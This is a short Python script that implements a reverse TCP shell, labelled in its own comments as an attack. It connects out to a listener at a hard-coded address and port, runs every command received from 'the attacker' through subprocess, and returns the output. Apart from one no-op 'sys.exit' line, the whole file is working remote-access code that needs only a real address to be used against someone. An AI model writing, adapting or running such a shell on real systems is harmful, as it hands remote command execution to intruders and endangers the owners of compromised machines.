# Reverse TCP shell attack

# Imports
import socket
import subprocess
import sys

# Creating socket structure
# Ipv4 address
# Using TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Binding address
HOST = '127.0.0.1'
# Port
PORT = 12345

# Connect to host
# This is where the Reverse part comes into play
sock.connect((HOST, PORT))

while True:
    # Recieve the command from the attacker and decode it
    command = sock.recv(1024).decode()

    # Split the command into individual arguments
    argv = command.split()

    # We run the command now
    result = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    # Send result back to attacker
    sock.send(result.stdout)

    # exit loop
    sys.exit

